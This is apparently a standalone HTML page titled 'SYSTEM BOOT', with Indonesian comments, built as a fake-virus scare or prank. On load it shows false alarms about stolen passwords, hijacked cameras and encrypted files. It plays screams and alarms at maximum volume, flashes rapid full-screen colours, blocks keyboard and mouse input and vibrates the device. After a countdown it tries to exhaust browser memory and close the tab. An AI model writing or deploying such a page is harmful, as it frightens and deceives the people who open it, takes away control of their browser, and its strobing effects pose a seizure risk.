<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM BOOT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            cursor: none !important;
            user-select: none;
        }
        body {
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            height: 100vh;
            position: fixed;
            width: 100%;
        }
        .extreme-panic {
            animation: extremePanic 0.1s infinite;
        }
        @keyframes extremePanic {
            0% { 
                background: #ff0000; 
                transform: scale(1) rotate(0deg);
                filter: hue-rotate(0deg) blur(0px);
            }
            25% { 
                background: #0000ff; 
                transform: scale(1.2) rotate(5deg);
                filter: hue-rotate(90deg) blur(3px);
            }
            50% { 
                background: #00ff00; 
                transform: scale(0.8) rotate(-5deg);
                filter: hue-rotate(180deg) blur(5px);
            }
            75% { 
                background: #ffff00; 
                transform: scale(1.1) rotate(3deg);
                filter: hue-rotate(270deg) blur(2px);
            }
            100% { 
                background: #ff0000; 
                transform: scale(1) rotate(0deg);
                filter: hue-rotate(0deg) blur(0px);
            }
        }
        .panic-text {
            position: fixed;
            font-size: 40px;
            font-weight: bold;
            color: #ffffff;
            text-shadow: 0 0 20px #ff0000;
            z-index: 10000;
            animation: textPanic 0.5s infinite;
        }
        @keyframes textPanic {
            0% { transform: scale(1) rotate(0deg); opacity: 1; }
            50% { transform: scale(1.3) rotate(10deg); opacity: 0.7; }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }
        .blood-effect {
            position: fixed;
            font-size: 30px;
            color: #ff0000;
            z-index: 9999;
            animation: bloodDrip 2s linear forwards;
        }
        @keyframes bloodDrip {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        .countdown {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 100px;
            color: #ffffff;
            text-shadow: 0 0 30px #ff0000;
            z-index: 100000;
            animation: countdownPulse 0.5s infinite;
        }
        @keyframes countdownPulse {
            0%, 100% { transform: translate(-50%, -50%) scale(1); }
            50% { transform: translate(-50%, -50%) scale(1.2); }
        }
    </style>
</head>
<body>
    <div id="panicContainer"></div>
    <div id="countdown" class="countdown">10</div>

    <!-- AUDIO ELEMENTS - PAKE LOCAL FILE -->
    <audio id="virusSound" loop>
        <!-- Ganti "virus.mp3" dengan nama file sound kamu -->
        <source src="virus.mp3" type="audio/mp3">
        <source src="virus.wav" type="audio/wav">
        <source src="virus.ogg" type="audio/ogg">
    </audio>

    <audio id="screamSound">
        <source src="scream.mp3" type="audio/mp3">
        <source src="scream.wav" type="audio/wav">
    </audio>

    <audio id="alarmSound" loop>
        <source src="alarm.mp3" type="audio/mp3">
        <source src="alarm.wav" type="audio/wav">
    </audio>

    <script>
        // Audio elements
        const virusSound = document.getElementById('virusSound');
        const screamSound = document.getElementById('screamSound');
        const alarmSound = document.getElementById('alarmSound');

        // Panic messages
        const panicMessages = [
            "💀 VIRUS DETECTED! 💀",
            "🚨 SYSTEM COMPROMISED! 🚨",
            "📡 DATA THEFT IN PROGRESS!",
            "👁️ CAMERA HIJACKED!",
            "🎤 MICROPHONE ACTIVATED!",
            "📍 LOCATION TRACKING!",
            "💾 FILES ENCRYPTED!",
            "💰 BANK ACCOUNTS HACKED!",
            "🔐 PASSWORDS STOLEN!",
            "📱 DEVICE BRICKED!",
            "🌐 NETWORK BREACHED!",
            "⚡ CRITICAL FAILURE!",
            "🔥 SYSTEM MELTDOWN!",
            "💥 EXPLOSIVE BREACH!",
            "👻 GHOST IN SYSTEM!"
        ];

        function startExtremePanic() {
            console.log("Starting extreme panic...");
            
            // PLAY SOUNDS - Volume MAX!
            playAllSounds();
            
            // EXTREME VISUAL EFFECTS
            document.body.classList.add('extreme-panic');
            
            // HIJACK CONTROLS
            hijackEverything();
            
            // CREATE EFFECTS
            createBloodRain();
            showPanicTexts();
            startCountdown();
            
            // START VIBRATION
            startVibration();
        }

        function playAllSounds() {
            console.log("Playing sounds...");
            
            // Set volume to MAX
            virusSound.volume = 1.0;
            alarmSound.volume = 1.0;
            screamSound.volume = 1.0;
            
            // Play main virus sound
            virusSound.play().then(() => {
                console.log("Virus sound playing");
            }).catch(error => {
                console.log("Virus sound error:", error);
                // Fallback - create oscillator sound
                createFallbackSound();
            });
            
            // Play alarm sound
            alarmSound.play().catch(error => {
                console.log("Alarm sound error:", error);
            });
            
            // Play scream every 5 seconds
            setInterval(() => {
                screamSound.currentTime = 0;
                screamSound.play().catch(error => {
                    console.log("Scream sound error:", error);
                });
            }, 5000);
        }

        function createFallbackSound() {
            // Create emergency sound using Web Audio API
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.type = 'sawtooth';
                oscillator.frequency.setValueAtTime(200, audioContext.currentTime);
                gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
                
                oscillator.start();
                
                // Change frequency randomly
                setInterval(() => {
                    oscillator.frequency.setValueAtTime(100 + Math.random() * 500, audioContext.currentTime);
                }, 100);
                
            } catch (error) {
                console.log("Fallback sound failed:", error);
            }
        }

        function hijackEverything() {
            // Block keyboard
            document.addEventListener('keydown', (e) => {
                e.preventDefault();
                createExplosionEffect(Math.random() * window.innerWidth, Math.random() * window.innerHeight);
            });

            // Block mouse
            document.addEventListener('click', (e) => {
                e.preventDefault();
                createBloodEffect(e.clientX, e.clientY);
            });

            // Block right click
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
            });

            // Hijack mouse movement
            document.addEventListener('mousemove', (e) => {
                if (Math.random() > 0.7) {
                    window.scrollTo(Math.random() * 500, Math.random() * 500);
                }
            });
        }

        function createBloodRain() {
            setInterval(() => {
                for (let i = 0; i < 3; i++) {
                    const blood = document.createElement('div');
                    blood.className = 'blood-effect';
                    blood.textContent = '💀';
                    blood.style.left = Math.random() * 100 + 'vw';
                    blood.style.fontSize = (20 + Math.random() * 30) + 'px';
                    document.body.appendChild(blood);
                    
                    setTimeout(() => blood.remove(), 2000);
                }
            }, 300);
        }

        function showPanicTexts() {
            setInterval(() => {
                for (let i = 0; i < 2; i++) {
                    const text = document.createElement('div');
                    text.className = 'panic-text';
                    text.textContent = panicMessages[Math.floor(Math.random() * panicMessages.length)];
                    text.style.left = Math.random() * 70 + 'vw';
                    text.style.top = Math.random() * 70 + 'vh';
                    text.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
                    document.body.appendChild(text);
                    
                    setTimeout(() => text.remove(), 3000);
                }
            }, 800);
        }

        function startCountdown() {
            let count = 10;
            const countdownElement = document.getElementById('countdown');
            
            const countdown = setInterval(() => {
                count--;
                countdownElement.textContent = count;
                
                // Increase intensity
                if (count <= 5) {
                    countdownElement.style.fontSize = '120px';
                    countdownElement.style.animation = 'countdownPulse 0.2s infinite';
                }
                
                if (count <= 0) {
                    clearInterval(countdown);
                    triggerBrowserCrash();
                }
            }, 1000);
        }

        function startVibration() {
            if (navigator.vibrate) {
                setInterval(() => {
                    navigator.vibrate([200, 100, 200, 100, 200]);
                }, 2000);
            }
        }

        function createExplosionEffect(x, y) {
            for (let i = 0; i < 10; i++) {
                const particle = document.createElement('div');
                particle.style.position = 'fixed';
                particle.style.left = x + 'px';
                particle.style.top = y + 'px';
                particle.style.width = '15px';
                particle.style.height = '15px';
                particle.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
                particle.style.borderRadius = '50%';
                particle.style.zIndex = '99999';
                
                const angle = Math.random() * Math.PI * 2;
                const distance = 50 + Math.random() * 100;
                
                document.body.appendChild(particle);
                
                particle.animate([
                    { transform: 'translate(0, 0) scale(1)', opacity: 1 },
                    { transform: `translate(${Math.cos(angle) * distance}px, ${Math.sin(angle) * distance}px) scale(0)`, opacity: 0 }
                ], {
                    duration: 1000,
                    easing: 'ease-out'
                });
                
                setTimeout(() => particle.remove(), 1000);
            }
        }

        function createBloodEffect(x, y) {
            const blood = document.createElement('div');
            blood.style.position = 'fixed';
            blood.style.left = x + 'px';
            blood.style.top = y + 'px';
            blood.style.fontSize = '30px';
            blood.style.color = '#ff0000';
            blood.style.zIndex = '99999';
            blood.textContent = '🩸';
            document.body.appendChild(blood);
            
            setTimeout(() => blood.remove(), 2000);
        }

        function triggerBrowserCrash() {
            // Try to crash or close browser
            try {
                // Memory overload
                const hugeArray = [];
                for (let i = 0; i < 100; i++) {
                    hugeArray.push(new Array(100000).fill('CRASH'));
                }
            } catch (e) {
                // Redirect to blank
                for (let i = 0; i < 10; i++) {
                    window.location.href = 'about:blank';
                }
                // Try to close
                window.open('', '_self', '');
                window.close();
            }
        }

        // START PANIC IMMEDIATELY
        window.onload = startExtremePanic;

        // Auto-start after 3 seconds if sounds fail
        setTimeout(() => {
            if (virusSound.paused) {
                console.log("Sounds failed, using fallback");
                createFallbackSound();
            }
        }, 3000);

    </script>
</body>
</html>
